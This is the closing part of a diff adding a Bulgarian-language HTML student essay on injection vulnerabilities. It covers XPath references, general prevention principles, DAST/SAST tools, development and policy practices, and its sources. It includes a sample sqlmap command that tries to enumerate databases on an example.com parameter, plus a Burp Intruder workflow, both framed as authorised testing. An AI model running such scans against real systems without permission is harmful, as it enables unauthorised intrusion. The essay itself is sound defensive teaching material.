+                    <li>Използвайте персонализирани страници за грешки без детайлна информация</li>
+                </ul>
+            </div>
+
+            <div class="reference">
+                <strong>Източници:</strong><br>
+                OWASP Foundation. (n.d.). <em>XPATH Injection</em>. Достъпно на: <a
+                    href="https://owasp.org/www-community/attacks/XPATH_Injection">https://owasp.org/www-community/attacks/XPATH_Injection</a><br>
+                OWASP Foundation. (n.d.). <em>Blind XPath Injection</em>. Достъпно на: <a
+                    href="https://owasp.org/www-community/attacks/Blind_XPath_Injection">https://owasp.org/www-community/attacks/Blind_XPath_Injection</a><br>
+                Vaadata. (2025). <em>XPath Injections: Exploitations and Security Tips</em>. Достъпно на: <a
+                    href="https://www.vaadata.com/blog/xpath-injections-exploitations-and-security-tips/">https://www.vaadata.com/blog/xpath-injections-exploitations-and-security-tips/</a>
+            </div>
+        </section>
+
+        <section>
+            <h2>7. Обща превенция и добри практики</h2>
+
+            <h3>7.1. Принципи за защита</h3>
+            <p>Независимо от типа инжекционна атака, съществуват общи принципи за защита, които трябва да се прилагат:
+            </p>
+
+            <div class="info">
+                <strong>Основни принципи за превенция:</strong>
+                <ol>
+                    <li><strong>Използване на безопасни API</strong> - Предпочитайте параметризирани интерфейси пред
+                        динамични заявки</li>
+                    <li><strong>Валидация на входни данни</strong> - Прилагайте <em>whitelist</em> валидация на всички
+                        потребителски входове</li>
+                    <li><strong>Санитизация и <em>Escaping</em></strong> - Използвайте специфични за интерпретатора
+                        escape функции</li>
+                    <li><strong>Принцип на най-малките привилегии</strong> - Ограничете правата на базите данни и
+                        системните акаунти</li>
+                    <li><strong>Защита в дълбочина (<em>Defense in depth</em>)</strong> - Комбинирайте множество техники
+                        за защита</li>
+                </ol>
+            </div>
+
+            <h3>7.2. Инструменти за откриване и тестване</h3>
+            <p>За да откриете и потвърдите инжекционни уязвимости, използвайте комбинация от автоматизирани и ръчни
+                техники. Нито един инструмент не е пълен сам по себе си — добрата практика е да комбинирате няколко
+                подхода (SAST + DAST + ръчни тестове).</p>
+
+            <div class="info">
+                <strong>Често използвани класове инструменти:</strong>
+                <ul>
+                    <li><strong>DAST (Dynamic Application Security Testing):</strong> Тества приложението в изпълнение —
+                        например Burp Suite, OWASP ZAP, Acunetix. Подходящи за откриване на SQLi, OS command injection,
+                        XPATH и др.</li>
+                    <li><strong>SAST (Static Application Security Testing):</strong> Анализира изходния код (или
+                        байткода) за уязвими патерни преди изпълнение. Помага за намиране на уязвимости при конкатенация
+                        на низове, неправилно използване на API и т.н.</li>
+                    <li><strong>IAST/Runtime Analysis:</strong> Инструменти, които наблюдават приложението по време на
+                        изпълнение и дават контекст към намерените проблеми (например посочват конкретния ред код,
+                        отговорен за уязвимостта).</li>
+                    <li><strong>Специализирани скенери за инжекции:</strong> sqlmap (за SQLi), NoSQLMap / NoSQLi tools
+                        (за NoSQL), инструменти за LDAP/XPath fuzzing.</li>
+                    <li><strong>WAF (Web Application Firewall):</strong> Може да блокира известни payload-и и да
+                        предостави допълнителен слой защита при конфигуриране.</li>
+                    <li><strong>Fuzzing и кастомни payload списъци:</strong> Използвайте fuzzing за откриване на
+                        неочаквано поведение (burp intruder, ffuf и др.).</li>
+                </ul>
+            </div>
+
+            <h3>7.3. Примери за използване на инструменти</h3>
+            <figure>
+                <figcaption><strong>Програмен код 22:</strong> Пример за бърза проверка с sqlmap</figcaption>
+                <pre><code># Примерна команда (sqlmap) за тестване на параметър 'id' за SQLi:
+sqlmap -u "https://example.com/product?id=1" --batch --level=2 --risk=2 --dbs
+
+# Обяснение:
+# --batch: без интерактивни въпроси
+# --level/--risk: настройват интензивността на тестовете
+# --dbs: опитва се да извлече списък с бази данни</code></pre>
+            </figure>
+
+            <figure>
+                <figcaption><strong>Програмен код 23:</strong> Бърз ръчен пример с Burp Suite (Intruder)</figcaption>
+                <pre><code>// Работен процес (резюме):
+1. Захванете заявката в Burp Proxy.
+2. Изберете параметъра за тестване и го сложете в Intruder (позиция).
+3. Заредете подходящ payload списък (SQLi, OS commands и т.н.).
+4. Стартирайте атаката и анализирайте отговорите за индикации (изменение на дължина, време, грешки).</code></pre>
+            </figure>
+
+            <div class="info">
+                <strong>Бележка:</strong> При автоматизирано тестване винаги следвайте етични правила: тествайте само в
+                рамките на позволени среди (staging, pen-test договор, с разрешение). Не сканирайте системи без изрично
+                разрешение.
+            </div>
+
+            <h3>7.4. Практически стъпки и съвети</h3>
+            <p>Кратък списък за интегриране на тестове и превенция в процеса на разработка:</p>
+            <ol>
+                <li><strong>Дефинирайте критични входни точки:</strong> Формуляри, API параметри, заглавки, файлови
+                    uploads, cookie-та.</li>
+                <li><strong>Внедрете параметризиране:</strong> Заместете конкатенации в заявки с параметризирани API-та
+                    или ORM колекции.</li>
+                <li><strong>Валидация и санитизация:</strong> Whitelist валидация на всички входове; по-стриктна
+                    валидация за идентификатори и командни параметри.</li>
+                <li><strong>Лесно разбираема грешкова политика:</strong> Скриване на чувствителни съобщения от крайния
+                    потребител; логвайте грешки за вътрешен анализ.</li>
+                <li><strong>Интегрирано тестване:</strong> Автоматизирани DAST/SAST в CI/CD; периодични ръчни
+                    penetration тестове.</li>
+                <li><strong>Мониторинг и логване:</strong> Логвайте неуспешни заявки, необичайни забавяния (time-based
+                    attacks) и аномалии; настройте алерти.</li>
+                <li><strong>Ограничаване на права и сегментация:</strong> Не давайте на приложението повече права от
+                    необходимото; отделете чувствителни функции на различни акаунти/услуги.</li>
+                <li><strong>Обучение на екипа:</strong> Провеждайте редовни обучения за secure coding и review сесии.
+                </li>
+            </ol>
+
+            <h3>7.5. Политики и процеси</h3>
+            <p>За да бъде защитата ефективна, организационно трябва да съществуват следните процеси:</p>
+            <ul>
+                <li><strong>Secure SDLC:</strong> Включете сигурността още в проектирането (threat modelling), през
+                    разработката (secure coding) до тест и деплой.</li>
+                <li><strong>Политика за управление на зависимости:</strong> Използвайте инструменти за сканиране на
+                    зависимости (SCA) и актувайте при откриване на уязвимости в библиотеки.</li>
+                <li><strong>План за реакция при инциденти:</strong> Наличност на playbook за реагиране при
+                    компрометация, включително комуникация, форензика и мерки за ограничаване на щетите.</li>
+                <li><strong>Редовни одити и външни тестове:</strong> Наемайте независими penetration тестери и
+                    провеждайте periodic security reviews.</li>
+            </ul>
+        </section>
+
+        <section>
+            <h2>8. Малко финални думи</h2>
+            <p>Инжекционните уязвимости остават сред най-опасните и най-често експлоатираните слабости в уеб
+                приложенията. В основата си, всички инжекции са резултат от това, че непроверени/недостоверни данни
+                биват третирани като код или част от команда. Разликите между SQL, NoSQL, OS, LDAP или XPath инжекции
+                произлизат от различните „интерпретатори“ (SQL engine, MongoDB, shell, LDAP server, XPath processor), но
+                превенцията е семпла и еднакво приложима:</p>
+            <ul>
+                <li><strong>Не записвайте данни в код/команда без проверка.</strong></li>
+                <li><strong>Използвайте параметризирани интерфейси и безопасни API.</strong></li>
+                <li><strong>Валидирайте, санитизирайте и ескейпвайте входа</strong> спрямо контекста (SQL, shell, LDAP,
+                    XML).</li>
+                <li><strong>Включете автоматизирани тестове и ръчно тестване</strong> като част от процеса на
+                    разработка.</li>
+            </ul>
+
+            <p>Ефективната защита не се изгражда само с един трик — тя изисква многостепенен подход: безопасен код,
+                добри практики в конфигурацията, мониторинг и готовност за реакция при инциденти. Инвестицията в сигурен
+                процес и инструменти намалява риска за бизнеса и защитава доверието на потребителите.</p>
+
+            <p><strong>Ключови послания:</strong></p>
+            <ol>
+                <li>Разглеждайте входа като недоверен.</li>
+                <li>Разграничете данни от команди чрез параметризиране.</li>
+                <li>Тествайте систематично (автоматично и ръчно).</li>
+                <li>Поддържайте екипа и зависимостите актуални.</li>
+            </ol>
+        </section>
+
+        <section>
+            <h2>Употреба на AI в реферата</h2>
+            <p>Никоя част от текстовото съдържание на този реферат не е генерирано с помощта на изкуствен интелект. AI (ChatGPT) 
+                е използван за подобряване на примерен код, изглед на страницата (CSS) и превод между английски и български. 
+                Цялостната редакция, проверка и допълване на информацията са извършени от човешки автор (аз или посочен източник) 
+                с цел осигуряване на точност, релевантност и да не ме хлебят относно плагиатство.</p>
+        </section>
+
+        <footer>
+            <p><strong>Източници:</strong></p>
+            <div class="reference">
+                <ul>
+                    <li>OWASP. <em>A03:2021 Injection</em>. https://owasp.org/Top10/A03_2021-Injection/</li>
+                    <li>PortSwigger. <em>SQL injection</em>. https://portswigger.net/web-security/sql-injection</li>
+                    <li>PortSwigger. <em>NoSQL injection</em>. https://portswigger.net/web-security/nosql-injection</li>
+                    <li>Acunetix. <em>Injection attacks</em> (articles).
+                        https://www.acunetix.com/blog/articles/injection-attacks/</li>
+                    <li>Acunetix. <em>SQL Injection</em>. https://www.acunetix.com/websitesecurity/sql-injection/</li>
+                    <li>Acunetix. <em>NoSQL Injections</em>.
+                        https://www.acunetix.com/blog/web-security-zone/nosql-injections/</li>
+                    <li>Imperva. <em>What Is NoSQL Injection?</em>.
+                        https://www.imperva.com/learn/application-security/nosql-injection/</li>
+                    <li>OWASP Cheat Sheet Series. <em>OS Command Injection Defense Cheat Sheet</em>.
+                        https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html
+                    </li>
+                    <li>Imperva. <em>What is LDAP Injection</em>.
+                        https://www.imperva.com/learn/application-security/ldap-injection/</li>
+                    <li>sqlmap project. https://github.com/sqlmapproject/sqlmap</li>
+                </ul>
+            </div>
+            <p>Рефератът е подготвен като учебен материал. Всички примери са предназначени за образователни цели.
+                Тествайте само в контролирани и разрешени среди.</p>
+            <p>© Всички права са незапазени</p>
+        </footer>
+    </article>
+</body>
+
+</html>
